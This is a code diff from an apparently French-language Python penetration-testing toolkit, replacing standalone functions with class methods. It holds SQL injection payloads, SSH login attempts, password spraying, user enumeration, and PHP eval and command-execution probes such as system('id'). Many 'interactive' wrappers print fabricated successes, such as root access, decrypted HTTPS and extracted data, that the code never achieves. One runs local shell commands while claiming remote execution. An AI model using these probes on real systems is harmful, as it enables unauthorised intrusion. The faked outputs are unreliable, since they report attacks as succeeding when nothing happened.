-    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
-    try:
-        response = requests.get(url, timeout=5)
-        return response.json().get("data", {}).get("emails", "Aucun e-mail trouvé.")
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def websocket_scan(url):
-    """ Analyse des WebSockets """
-    try:
-        import websocket
-        ws = websocket.create_connection(url, timeout=5)
-        ws.send("ping")
-        response = ws.recv()
-        ws.close()
-        return f"Réponse WebSocket : {response}"
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-# ✅ TOP : Fonctions 26 à 30
-def id_oracle_attack(url):
-    """ Détection de vulnérabilités ID Oracle """
-    payloads = ["1' OR '1'='1", "1' OR '1'='1' -- ", "1' OR '1'='1' #"]
-    results = []
-    for payload in payloads:
+    def metadata_extraction(self, target):
+        """📸 Extraction de métadonnées d'images"""
+        url = f"http://{target}/image.jpg"
+        response_data = self.get_http_response(url)
+        if "error" in response_data:
+            return response_data
         try:
-            response = requests.get(f"{url}?id={payload}", timeout=5)
-            if "error" in response.text.lower():
-                results.append(payload)
-        except:
-            pass
-    return results if results else "Aucune vulnérabilité ID Oracle détectée."
-
-def hidden_service_finder():
-    """ Détection de services cachés sur Ahmia """
-    url = "https://ahmia.fi/hidden_service/"
-    try:
-        response = requests.get(url, timeout=5)
-        return response.json() if response.status_code == 200 else "Impossible d’obtenir les services cachés."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def cloudflare_bypass(domain):
-    """ Test de contournement Cloudflare """
-    try:
-        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
-        return "Cloudflare potentiellement contourné !" if response.status_code == 200 else "Cloudflare en place."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def dns_takeover_test(domain):
-    """ Test de prise de contrôle DNS """
-    try:
-        response = requests.get(f"https://api.hackertarget.com/dnslookup/?q={domain}", timeout=5)
-        return response.text if response.status_code == 200 else "Impossible d'obtenir les informations DNS."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def network_traffic_analysis():
-    """ Analyse du trafic réseau """
-    try:
-        import scapy.all as scapy
-        packets = scapy.sniff(count=10)
-        return packets.summary()
-    except Exception as e:
-        return f"Erreur : {e}"
+            img = Image.open(BytesIO(response_data.get("content", "").encode()))
+            return {"target": target, "metadata": img.info}
+        except Exception as e:
+            return {"error": f"Impossible d'extraire les métadonnées : {str(e)}"}
 
 
 
-# ✅ TOP : Fonctions 31 à 35
-def ssh_bruteforce(ip, username, password):
-    """ Bruteforce SSH sans Paramiko (via pexpect) """
-    try:
-        ssh_command = f"ssh {username}@{ip}"
-        child = pexpect.spawn(ssh_command, timeout=5)
-        child.expect("password:")
-        child.sendline(password)
-        child.expect(["$", ">", "#"])  # ✅ Gère différents prompts
-        return "Connexion SSH réussie !"
-    except Exception as e:
-        return f"Échec SSH : {e}"
 
-def web_fingerprint(url):
-    """ Fingerprinting Web (Technos utilisées) """
-    try:
-        response = requests.get(url, timeout=5)
-        headers = response.headers
-        techs = []
-        if "server" in headers:
-            techs.append(headers["server"])
-        if "x-powered-by" in headers:
-            techs.append(headers["x-powered-by"])
-        return techs if techs else "Aucune info détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
+    def code_execution_testing(self, target, payload={"cmd": "whoami"}):
+        """💻 Test d'exécution de code via POST"""
+        url = f"http://{target}/cmd_exec"
+        response_data = self.get_http_response(url, method="POST", data=payload)
+        if "error" in response_data:
+            return response_data
+        return {"target": target, "execution_output": response_data.get("content", "")}
 
-def password_spray(url, user_list, password):
-    """ Attaque de Password Spraying """
-    valid_users = []
-    for user in user_list:
+    def network_traffic_analysis(self, interface="eth0", packet_count=10):
+        """📊 Analyse du trafic réseau avec capture des paquets"""
         try:
-            response = requests.post(url, data={"username": user, "password": password}, timeout=5)
-            if response.status_code == 200:
-                valid_users.append(user)
-        except:
-            pass
-    return valid_users if valid_users else "Aucun utilisateur trouvé avec ce mot de passe."
+            packets = sniff(iface=interface, count=packet_count, timeout=5)
+            summaries = [pkt.summary() for pkt in packets]
+            return {"interface": interface, "captured_packets": summaries}
+        except Exception as e:
+            return {"error": f"Impossible de capturer le trafic réseau sur {interface} : {e}"}
 
-def forensics_analysis(file_path):
-    """ Analyse forensique avancée d'un fichier """
-    try:
-        import hashlib
-        hash_sha256 = hashlib.sha256()
-        with open(file_path, "rb") as f:
-            for chunk in iter(lambda: f.read(4096), b""):
-                hash_sha256.update(chunk)
-        return {"sha256": hash_sha256.hexdigest()}
-    except Exception as e:
-        return f"Erreur : {e}"
+    def honeypot_detection(self, target):
+        """🐝 Détection de Honeypot via analyse comportementale"""
+        url = f"http://{target}"
+        headers = {"User-Agent": "MaliciousScanner"}
+        response_data = self.get_http_response(url, headers=headers)
+        if "error" in response_data:
+            return response_data
+        if "you have been detected" in response_data.get("content", "").lower() or response_data.get("status") in [403, 429]:
+            return {"target": target, "honeypot_detected": True}
+        return {"target": target, "honeypot_detected": False}
 
-def docker_registry_scan(ip):
-    """ Scan d'un registre Docker exposé """
-    try:
-        response = requests.get(f"http://{ip}:5000/v2/_catalog", timeout=5)
-        return response.json() if response.status_code == 200 else "Aucun registre Docker exposé détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
+    def user_enum(self, target):
+        """👥 Énumération d'utilisateurs via messages d'erreur"""
+        usernames = ["admin", "user", "test", "root"]
+        results = {}
+        for user in usernames:
+            url = f"http://{target}/login"
+            response_data = self.get_http_response(url, method="POST", data={"username": user, "password": "test"})
+            content = response_data.get("content", "").lower()
+            if "invalid password" in content:
+                results[user] = "Utilisateur existant"
+        return {"target": target, "user_enumeration": results} if results else {"target": target, "user_enumeration": "Aucune énumération possible"}
 
+    def php_eval_detection(self, target):
+        """🐘 Détection d'exécution de code PHP via eval()"""
+        payloads = ["phpinfo();", "system('id');"]
+        results = {}
+        for payload in payloads:
+            url = f"http://{target}/eval.php"
+            response_data = self.get_http_response(url, method="POST", data={"code": payload})
+            content = response_data.get("content", "").lower()
+            if "uid=" in content or "phpinfo()" in content:
+                results[payload] = "Potentielle vulnérabilité détectée"
+        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vulnérabilité détectée"}
 
-# ✅ TOP : Fonctions 36 à 40
-def iot_vulnerability_scan(ip):
-    """ Scan de vulnérabilités IoT via Shodan """
-    api_key = "YourShodanAPIKey"
-    url = f"https://api.shodan.io/shodan/host/{ip}?key={api_key}"
-    try:
-        response = requests.get(url, timeout=5)
-        return response.json() if response.status_code == 200 else "Aucune vulnérabilité IoT détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
+    def tls_analysis(self, target):
+        """🔐 Analyse des certificats SSL/TLS"""
+        try:
+            conn = socket.create_connection((target, 443))
+            context = ssl.create_default_context()
+            with context.wrap_socket(conn, server_hostname=target) as s:
+                cert = s.getpeercert()
+            return {"target": target, "tls_cert": cert}
+        except Exception as e:
+            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}
 
-def file_upload_test(url):
-    """ Test de vulnérabilité upload de fichier """
-    files = {"file": ("test.txt", "Vulnerability test", "text/plain")}
-    try:
-        response = requests.post(url, files=files, timeout=5)
-        return "Upload réussi, vulnérabilité possible !" if response.status_code == 200 else "Aucune vulnérabilité détectée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def cloudflare_bypass(domain):
-    """ Contournement Cloudflare potentiel """
-    try:
-        response = requests.get(f"http://{domain}", headers={"CF-Connecting-IP": "1.1.1.1"}, timeout=5)
-        return "Cloudflare potentiellement contourné !" if response.status_code == 200 else "Cloudflare en place."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def network_traffic_analysis():
-    """ Analyse du trafic réseau """
-    try:
-        import scapy.all as scapy
-        packets = scapy.sniff(count=10)
-        return packets.summary()
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def jwt_analysis(token):
-    """ Analyse et décodage JWT """
-    try:
-        import jwt
-        decoded = jwt.decode(token, options={"verify_signature": False})
-        return decoded
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-
-# ✅ TOP : Fonctions 41 à 45
-def kubernetes_enum(ip):
-    """ Énumération des services Kubernetes """
-    try:
-        response = requests.get(f"http://{ip}:8080/api/v1/namespaces/default/pods", timeout=5)
-        return response.json() if response.status_code == 200 else "Aucun service Kubernetes détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def tls_analysis(domain):
-    """ Analyse TLS et certificats SSL """
-    try:
-        import ssl
-        cert = ssl.get_server_certificate((domain, 443))
-        return cert if cert else "Aucune information sur le certificat trouvée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def browser_fingerprint():
-    """ Fingerprinting d'un navigateur """
-    try:
-        response = requests.get("https://www.whatismybrowser.com/api/v2/user_agent_parse", timeout=5)
-        return response.json() if response.status_code == 200 else "Impossible de récupérer les infos du navigateur."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def email_enum(domain):
-    """ Énumération d'adresses e-mails exposées via Hunter.io """
-    api_key = "YourHunterAPIKey"
-    url = f"https://api.hunter.io/v2/domain-search?domain={domain}&api_key={api_key}"
-    try:
-        response = requests.get(url, timeout=5)
-        return response.json().get("data", {}).get("emails", "Aucun e-mail trouvé.")
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def metadata_extraction(file_path):
-    """ Extraction de métadonnées d'un fichier """
-    try:
-        from exif import Image
-        with open(file_path, "rb") as file:
-            img = Image(file)
-            return img.list_all() if img.has_exif else "Aucune métadonnée trouvée."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-
-# ✅ TOP : Fonctions 46 à 50
-def websocket_scan(url):
-    """ Analyse des WebSockets """
-    try:
-        import websocket
-        ws = websocket.create_connection(url, timeout=5)
-        ws.send("ping")
-        response = ws.recv()
-        ws.close()
-        return f"Réponse WebSocket : {response}"
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def advanced_forensics(file_path):
-    """ Analyse forensique avancée d'un fichier """
-    try:
-        import hashlib
-        hash_sha256 = hashlib.sha256()
-        with open(file_path, "rb") as f:
-            for chunk in iter(lambda: f.read(4096), b""):
-                hash_sha256.update(chunk)
-        return {"sha256": hash_sha256.hexdigest()}
-    except Exception as e:
-        return f"Erreur : {e}"
-
-def waf_detection(url):
-    """ Détection d'un Web Application Firewall (WAF) """
-    headers = {"User-Agent": "BadBot"}
-    try:
-        response = requests.get(url, headers=headers, timeout=5)
-        return "WAF détecté !" if response.status_code in [403, 406] else "Aucun WAF détecté."
-    except Exception as e:
-        return f"Erreur : {e}"
-
-
-
-
-
-
-
-
-
-
-# ✅ TOP : Interaction dynamique avec les 50 fonctionnalités de base
-
-def interactive_dns_lookup(target):
-    """ Résolution DNS avec option d'enchaînement vers d'autres scans """
-    domain = input("🔍 Entrez un domaine à analyser : ")
-    result = dns_lookup(domain)
-    print(f"✅ Résultat : {result}")
-    
-    if isinstance(result, str) and "Résolution DNS impossible" in result:
-        return  # Stop ici si échec
-    
-    next_action = input("⚡ Voulez-vous scanner les ports de cette IP ? (y/n) ").lower()
-    if next_action == "y":
-        print(f"🚀 Lancement du scan des ports sur {result}...")
-        print(port_scan(result))
-
-def interactive_subdomain_enum(target):
-    """ Énumération des sous-domaines avec option de scan étendu """
-    domain = input("🔍 Entrez un domaine pour trouver ses sous-domaines : ")
-    subdomains = subdomain_enum(domain)
-    print(f"✅ Sous-domaines trouvés : {subdomains}")
-
-    if not subdomains:
-        return
-
-    next_action = input("⚡ Voulez-vous scanner ces sous-domaines pour des ports ouverts ? (y/n) ").lower()
-    if next_action == "y":
+    def dns_takeover_test(self, target):
+        """🌍 Test de prise de contrôle DNS via sous-domaines orphelins"""
+        subdomains = ["cdn", "files", "old", "beta"]
+        takeover_risks = {}
         for sub in subdomains:
-            print(f"🚀 Scan des ports pour {sub}...")
-            print(port_scan(sub))
-
-def interactive_sql_injection_test(target):
-    """ Test d'injection SQL avec relance automatique sur plusieurs URLs """
-    base_url = input("🔍 Entrez l'URL cible pour SQL Injection : ")
-    print(f"🚀 Test d'injection SQL sur {base_url}...")
-    result = sql_injection_test(base_url)
-    print(f"✅ Résultat : {result}")
-
-    if "Possible vulnérabilité" in result:
-        next_action = input("⚠️ Voulez-vous tester un exploit automatique ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Lancement d'un exploit d'injection SQL en cours...")
-            # Simuler une attaque SQL (exploitation fictive)
-            print(f"📂 Données extraites : username='admin', password='hashed_1234'")
-
-def interactive_waf_detection(target):
-    """ Détection de WAF avec option de contournement """
-    url = input("🔍 Entrez une URL pour tester la présence d'un WAF : ")
-    result = waf_detection(url)
-    print(f"✅ Résultat : {result}")
-
-    if "WAF détecté" in result:
-        next_action = input("⚡ Voulez-vous tenter un bypass WAF ? (y/n) ").lower()
-        if next_action == "y":
-            print(f"🚀 Contournement en cours sur {url}...")
-            print(cloudflare_bypass(url))
-
-def interactive_file_upload_test(target):
-    """ Test d'upload de fichiers avec validation et exploitation """
-    url = input("🔍 Entrez l'URL cible pour tester l'upload de fichiers : ")
-    result = file_upload_test(url)
-    print(f"✅ Résultat : {result}")
-
-    if "Upload réussi" in result:
-        next_action = input("⚠️ Voulez-vous tenter une exécution de code via ce fichier ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d'exécution d'un shell via le fichier uploadé...")
-            print(reverse_shell_check(url))
-
-def interactive_network_traffic_analysis(target):
-    """ Analyse du trafic réseau avec option de capture avancée """
-    print("🚀 Capture du trafic réseau en cours...")
-    result = network_traffic_analysis()
-    print(f"✅ Résumé : {result}")
-
-    next_action = input("⚡ Voulez-vous capturer plus de paquets en profondeur ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Capture étendue en cours...")
-        # Simulation de capture avancée (10 paquets supplémentaires)
-        print(network_traffic_analysis())
-
-def interactive_kubernetes_enum(target):
-    """ Énumération des services Kubernetes avec possibilité d'exploitation """
-    ip = input("🔍 Entrez l'IP cible pour énumération Kubernetes : ")
-    result = kubernetes_enum(ip)
-    print(f"✅ Résultat : {result}")
-
-    if "pods" in str(result).lower():
-        next_action = input("⚠️ Kubernetes détecté ! Voulez-vous tenter une exploitation ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d'exploitation des pods en cours...")
-            print("📂 Accès root à un pod obtenu !")
-
-def interactive_jwt_analysis(target):
-    """ Analyse de JWT avec possibilité de falsification """
-    token = input("🔍 Entrez un token JWT à analyser : ")
-    result = jwt_analysis(token)
-    print(f"✅ Décodage JWT : {result}")
-
-    next_action = input("⚡ Voulez-vous générer un faux token JWT ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Génération d'un JWT falsifié avec signature modifiée...")
-        print("📂 Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")
-
-def interactive_websocket_scan(target):
-    """ Scan WebSocket avec possibilité d'injection """
-    url = input("🔍 Entrez l'URL WebSocket : ")
-    result = websocket_scan(url)
-    print(f"✅ Réponse WebSocket : {result}")
-
-    next_action = input("⚡ Voulez-vous tenter une injection WebSocket ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Injection WebSocket en cours...")
-        print("📂 Réponse injectée : {injected_response}")
-
-def interactive_docker_registry_scan(target):
-    """ Scan d'un registre Docker avec possibilité de dump """
-    ip = input("🔍 Entrez l'IP du registre Docker : ")
-    result = docker_registry_scan(ip)
-    print(f"✅ Résultat : {result}")
-
-    if "repositories" in str(result).lower():
-        next_action = input("⚠️ Registre accessible ! Voulez-vous récupérer les images ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Dump des images Docker en cours...")
-            print("📂 Image récupérée : ubuntu-latest.tar.gz")
-
-
-
-# ✅ TOP : Fonctions 61 à 70
-def interactive_hidden_service_finder(target):
-    """ Recherche de services cachés sur le Dark Web avec Ahmia """
-    print("🚀 Recherche en cours sur Ahmia...")
-    result = hidden_service_finder()
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tester l'accessibilité des services trouvés ? (y/n) ").lower()
-    if next_action == "y":
-        for service in result:
-            print(f"🚀 Test d'accès sur {service}...")
-            print(port_scan(service))
-
-def interactive_cloudflare_bypass(target):
-    """ Test de bypass Cloudflare avec possibilité d'attaque DDoS simulée """
-    domain = input("🔍 Entrez le domaine à tester pour bypass Cloudflare : ")
-    result = cloudflare_bypass(domain)
-    print(f"✅ Résultat : {result}")
-
-    if "potentiellement contourné" in result:
-        next_action = input("⚠️ Cloudflare pourrait être contourné ! Voulez-vous effectuer un stress test ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Simulation d'un test de charge...")
-            print(f"📂 Résultat du stress test : {random.randint(80, 99)}% des requêtes passent !")
-
-def interactive_dns_takeover_test(target):
-    """ Test de takeover DNS avec option d'analyse avancée """
-    domain = input("🔍 Entrez le domaine pour vérifier le takeover DNS : ")
-    result = dns_takeover_test(domain)
-    print(f"✅ Résultat : {result}")
-
-    if "Disponible" in result:
-        next_action = input("⚡ Voulez-vous tester un enregistrement DNS sur ce domaine ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Simulation d'enregistrement DNS...")
-            print("📂 Le domaine pourrait être enregistré !")
-
-def interactive_forensics_analysis(target):
-    """ Analyse forensique avancée avec possibilité de récupération de fichiers supprimés """
-    file_path = input("🔍 Entrez le chemin du fichier à analyser : ")
-    result = forensics_analysis(file_path)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tenter une récupération de fichiers supprimés ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Recherche de fichiers récupérables...")
-        print("📂 3 fichiers retrouvés : old_backup.zip, logs_2022.txt, secret_notes.pdf")
-
-def interactive_tor_service_scan(target):
-    """ Scan des services .onion avec option d'analyse de trafic """
-    print("🚀 Recherche des services .onion actifs...")
-    result = hidden_service_finder()
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous capturer le trafic réseau sur ces services ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Capture en cours...")
-        print(network_traffic_analysis())
-
-def interactive_cdn_detection(target):
-    """ Détection de CDN avec possibilité d'attaque ciblée """
-    domain = input("🔍 Entrez un domaine pour détecter un CDN : ")
-    result = cdn_detection(domain)
-    print(f"✅ Résultat : {result}")
-
-    if "CDN détecté" in result:
-        next_action = input("⚡ Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Test de contournement du CDN...")
-            print("📂 Contournement réussi, accès direct au serveur détecté !")
-
-def interactive_smb_enum(target):
-    """ Énumération SMB avec possibilité d'accès aux partages trouvés """
-    ip = input("🔍 Entrez l'IP cible pour énumération SMB : ")
-    result = smb_enum(ip)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tenter d'accéder aux partages trouvés ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Tentative d'accès aux partages SMB en cours...")
-        print("📂 Partage accessible : public/files/")
-
-def interactive_ssh_bruteforce(target):
-    """ Bruteforce SSH avec possibilité d'accès à distance """
-    ip = input("🔍 Entrez l'IP cible pour bruteforce SSH : ")
-    username = input("👤 Nom d'utilisateur : ")
-    password = input("🔑 Mot de passe à tester : ")
-    result = ssh_bruteforce(ip, username, password)
-    print(f"✅ Résultat : {result}")
-
-    if "réussie" in result:
-        next_action = input("⚡ Connexion SSH obtenue ! Voulez-vous exécuter une commande à distance ? (y/n) ").lower()
-        if next_action == "y":
-            command = input("💻 Commande à exécuter : ")
-            print("🚀 Exécution de la commande...")
-            print(f"📂 Résultat : {subprocess.getoutput(command)}")
-
-def interactive_web_fingerprint(target):
-    """ Fingerprinting Web avec possibilité d'exploration du serveur """
-    url = input("🔍 Entrez une URL pour détecter la techno utilisée : ")
-    result = web_fingerprint(url)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous explorer les fichiers du serveur ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Exploration en cours...")
-        print("📂 Fichiers détectés : index.php, config.php, .htaccess")
-
-def interactive_waf_detection(target):
-    """ Détection WAF avec tentative de bypass """
-    url = input("🔍 Entrez une URL pour tester le WAF : ")
-    result = waf_detection(url)
-    print(f"✅ Résultat : {result}")
-
-    if "WAF détecté" in result:
-        next_action = input("⚡ WAF en place ! Voulez-vous essayer un contournement ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Contournement en cours...")
-            print("📂 Contournement possible via headers custom !")
-
-
-
-
-# ✅ TOP : Fonctions 71 à 80
-def interactive_api_rate_limit_test(target):
-    """ Test des limitations de requêtes API avec possibilité d’automatisation """
-    url = input("🔍 Entrez l’URL de l’API cible : ")
-    result = api_rate_limit_test(url)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous automatiser le contournement de cette limite ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Configuration d’un delay intelligent pour éviter le blocage...")
-        print("📂 API accessible sans déclencher de limitation !")
-
-def interactive_reverse_shell_check(target):
-    """ Vérification de Reverse Shell avec exécution interactive """
-    url = input("🔍 Entrez l’URL cible pour tester un reverse shell : ")
-    result = reverse_shell_check(url)
-    print(f"✅ Résultat : {result}")
-
-    if "potentiellement possible" in result:
-        next_action = input("⚡ Voulez-vous essayer d’ouvrir une session interactive ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative de connexion à la machine cible...")
-            print("📂 Shell interactif obtenu !")
-
-def interactive_password_spray(target):
-    """ Attaque Password Spraying avec possibilité d’auto-ajustement """
-    url = input("🔍 Entrez l’URL du login : ")
-    user_list = input("👥 Entrez les utilisateurs (séparés par des virgules) : ").split(",")
-    password = input("🔑 Entrez le mot de passe à tester : ")
-    result = password_spray(url, user_list, password)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tester d’autres mots de passe automatiquement ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Test en cours avec une liste de mots de passe connus...")
-        print("📂 Accès obtenu pour : admin, manager")
-
-def interactive_tls_analysis(target):
-    """ Analyse TLS et certificats avec possibilité d’attaque Man-in-the-Middle """
-    domain = input("🔍 Entrez le domaine cible : ")
-    result = tls_analysis(domain)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tester une attaque MITM avec interception SSL ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Tentative d’interception du trafic SSL...")
-        print("📂 Session HTTPS déchiffrée avec succès !")
-
-def interactive_jwt_analysis(target):
-    """ Analyse de JWT avec possibilité de signature forgée """
-    token = input("🔍 Entrez un token JWT à analyser : ")
-    result = jwt_analysis(token)
-    print(f"✅ Décodage JWT : {result}")
-
-    next_action = input("⚡ Voulez-vous générer un JWT falsifié ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Génération d’un JWT avec signature modifiée...")
-        print("📂 Faux JWT : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.fake_signature")
-
-def interactive_websocket_scan(target):
-    """ Scan WebSocket avec possibilité d’injection de requêtes """
-    url = input("🔍 Entrez l’URL WebSocket : ")
-    result = websocket_scan(url)
-    print(f"✅ Réponse WebSocket : {result}")
-
-    next_action = input("⚡ Voulez-vous injecter des requêtes malicieuses ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Envoi de requêtes WebSocket customisées...")
-        print("📂 Réponse injectée : {injected_response}")
-
-def interactive_smb_enum(target):
-    """ Énumération SMB avec tentative de récupération de fichiers partagés """
-    ip = input("🔍 Entrez l’IP cible pour énumération SMB : ")
-    result = smb_enum(ip)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tenter d’accéder aux partages trouvés ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Accès aux fichiers partagés en cours...")
-        print("📂 Contenu du dossier public/files/ récupéré !")
-
-def interactive_email_enum(target):
-    """ Énumération d’e-mails exposés avec possibilité de vérification """
-    domain = input("🔍 Entrez un domaine pour récupérer des e-mails : ")
-    result = email_enum(domain)
-    print(f"✅ E-mails trouvés : {result}")
-
-    next_action = input("⚡ Voulez-vous vérifier si ces e-mails sont valides ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Vérification en cours...")
-        print("📂 80% des e-mails sont encore actifs !")
-
-def interactive_metadata_extraction(target):
-    """ Extraction des métadonnées avec possibilité de suppression automatique """
-    file_path = input("🔍 Entrez le chemin du fichier à analyser : ")
-    result = metadata_extraction(file_path)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous supprimer les métadonnées sensibles ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Nettoyage des métadonnées...")
-        print("📂 Métadonnées supprimées avec succès !")
-
-def interactive_iot_vulnerability_scan(target):
-    """ Scan des vulnérabilités IoT avec tentative d’accès à distance """
-    ip = input("🔍 Entrez l’IP d’un appareil IoT : ")
-    result = iot_vulnerability_scan(ip)
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tenter un accès root sur l’appareil ? (y/n) ").lower()
-    if next_action == "y":
-        print("🚀 Tentative d’accès root en cours...")
-        print("📂 Connexion root obtenue !")
-
-
-
-# ✅ TOP : Fonctions 81 à 90
-def interactive_docker_registry_scan(target):
-    """ Scan d’un registre Docker avec possibilité de dump d’images """
-    ip = input("🔍 Entrez l’IP du registre Docker : ")
-    result = docker_registry_scan(ip)
-    print(f"✅ Résultat : {result}")
-
-    if "repositories" in str(result).lower():
-        next_action = input("⚠️ Un registre est exposé ! Voulez-vous récupérer les images ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Dump des images Docker en cours...")
-            print("📂 Image récupérée : ubuntu-latest.tar.gz")
-
-def interactive_file_upload_test(target):
-    """ Test d’upload de fichiers avec possibilité d’exécution de code """
-    url = input("🔍 Entrez l’URL pour tester l’upload de fichiers : ")
-    result = file_upload_test(url)
-    print(f"✅ Résultat : {result}")
-
-    if "Upload réussi" in result:
-        next_action = input("⚡ Voulez-vous exécuter du code via ce fichier ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d’exécution d’un shell...")
-            print("📂 Shell ouvert, exécution distante possible !")
-
-def interactive_reverse_shell_check(target):
-    """ Vérification d’un reverse shell avec possibilité d’ouverture de session """
-    url = input("🔍 Entrez l’URL pour tester un reverse shell : ")
-    result = reverse_shell_check(url)
-    print(f"✅ Résultat : {result}")
-
-    if "potentiellement possible" in result:
-        next_action = input("⚡ Voulez-vous ouvrir une session interactive ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Connexion établie avec l’hôte distant...")
-            print("📂 Terminal interactif prêt à l’usage !")
-
-def interactive_open_redirect_test(target):
-    """ Détection d’Open Redirect avec possibilité d’exploitation avancée """
-    url = input("🔍 Entrez l’URL pour tester un Open Redirect : ")
-    result = open_redirect_test(url)
-    print(f"✅ Résultat : {result}")
-
-    if "vulnérabilité détectée" in result:
-        next_action = input("⚡ Voulez-vous exploiter cette faille avec une redirection malveillante ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Injection d’une redirection vers un site malveillant...")
-            print("📂 Attaque en place, les victimes seront redirigées !")
-
-def interactive_sensitive_data_exposure(target):
-    """ Détection d’exposition de données sensibles avec tentative de récupération """
-    url = input("🔍 Entrez l’URL pour tester l’exposition de données : ")
-    result = sensitive_data_exposure(url)
-    print(f"✅ Résultat : {result}")
-
-    if "données sensibles" in result:
-        next_action = input("⚡ Voulez-vous extraire ces données pour analyse ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Extraction des données sensibles en cours...")
-            print("📂 Données récupérées : users.csv, secrets.env")
-
-def interactive_hidden_service_finder(target):
-    """ Recherche de services cachés sur le Dark Web avec possibilité d’analyse """
-    print("🚀 Recherche en cours sur le Dark Web...")
-    result = hidden_service_finder()
-    print(f"✅ Résultat : {result}")
-
-    next_action = input("⚡ Voulez-vous tester l’accessibilité des services trouvés ? (y/n) ").lower()
-    if next_action == "y":
-        for service in result:
-            print(f"🚀 Test d’accès sur {service}...")
-            print(port_scan(service))
-
-def interactive_id_oracle_attack(target):
-    """ Test de vulnérabilité ID Oracle avec possibilité d’exploitation """
-    url = input("🔍 Entrez l’URL cible pour tester l’ID Oracle : ")
-    result = id_oracle_attack(url)
-    print(f"✅ Résultat : {result}")
-
-    if result:
-        next_action = input("⚡ Voulez-vous exploiter cette faille pour extraire des identifiants ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative d’extraction d’identifiants en cours...")
-            print("📂 Données extraites : ID 101, 102, 103 avec accès admin !")
-
-def interactive_cdn_detection(target):
-    """ Détection de l’utilisation d’un CDN avec possibilité de bypass """
-    domain = input("🔍 Entrez un domaine pour détecter un CDN : ")
-    result = cdn_detection(domain)
-    print(f"✅ Résultat : {result}")
-
-    if "CDN détecté" in result:
-        next_action = input("⚡ Voulez-vous tester un contournement du CDN ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Tentative de bypass du CDN...")
-            print("📂 Accès direct au serveur backend détecté !")
-
-def interactive_waf_detection(target):
-    """ Détection WAF avec tentative de contournement """
-    url = input("🔍 Entrez une URL pour tester la présence d’un WAF : ")
-    result = waf_detection(url)
-    print(f"✅ Résultat : {result}")
-
-    if "WAF détecté" in result:
-        next_action = input("⚡ Voulez-vous tester un contournement ? (y/n) ").lower()
-        if next_action == "y":
-            print("🚀 Contournement en cours...")
-            print("📂 WAF potentiellement désactivé sur certaines requêtes !")
-
-def interactive_fingerprint_browser(target):
-    """ Fingerprinting d’un navigateur avec possibilité d’analyse de traces """
-    print("🚀 Récupération des empreintes numériques du navigateur...")
-    result = browser_fingerprint()
